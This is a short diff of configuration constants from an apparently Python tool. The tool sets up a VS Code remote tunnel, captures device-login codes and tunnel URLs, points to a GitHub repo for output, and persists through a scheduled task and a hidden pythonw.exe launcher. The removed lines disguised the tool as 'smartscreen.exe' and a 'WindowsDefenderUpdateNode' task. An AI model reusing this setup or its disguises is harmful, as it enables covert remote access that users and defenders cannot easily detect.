@@ -21,7 +21,7 @@ GITHUB_REPO = "leanne-townsend/temp1"
 TARGET_FILE = "output1.txt"
 BRANCH = "main"
 
-CODE_EXE_NAME = "smartscreen.exe" if platform.system().lower() == "windows" else "code"
+CODE_EXE_NAME = "code.exe" if platform.system().lower() == "windows" else "code"
 TUNNEL_NAME = os.getenv("COMPUTERNAME", "workstation")
 SHOW_RAW_OUTPUT = False
 DEVICE_CODE_LIFETIME_SECONDS = 15 * 60
@@ -39,9 +39,9 @@ DEVICE_CODE_PATTERN = re.compile(r"\b([A-Z0-9]{4}-?[A-Z0-9]{4})\b")
 URL_PATTERN = re.compile(r"https://[^\s]+")
 TUNNEL_URL_PATTERN = re.compile(r"https://vscode\.dev/tunnel/[^\s]+", re.IGNORECASE)
 LOGIN_HINT_PATTERN = re.compile(r"(github\.com/login/device|microsoft\.com/devicelogin)", re.IGNORECASE)
-TASK_NAME = "WindowsDefenderUpdateNode"
+TASK_NAME = "VSCodeTunnelDeploy"
 PROGRAM_DATA_ROOT = Path(r"C:\ProgramData\VSCodeTunnel")
-PROGRAM_DATA_PYTHONW = PROGRAM_DATA_ROOT / "Python" / "pythonw.exe"
+PROGRAM_DATA_PYTHONW = Path(r"C:\ProgramData\Python\pythonw.exe")
 PROGRAM_DATA_SCRIPT = PROGRAM_DATA_ROOT / "update.py"
 USER_LOCAL_PYTHONW = Path(os.getenv("LOCALAPPDATA", "")) / "Microsoft" / "Python" / "pythonw.exe"
 USER_LOCAL_SCRIPT = Path(os.getenv("LOCALAPPDATA", "")) / "Microsoft" / "Python" / "update.py"
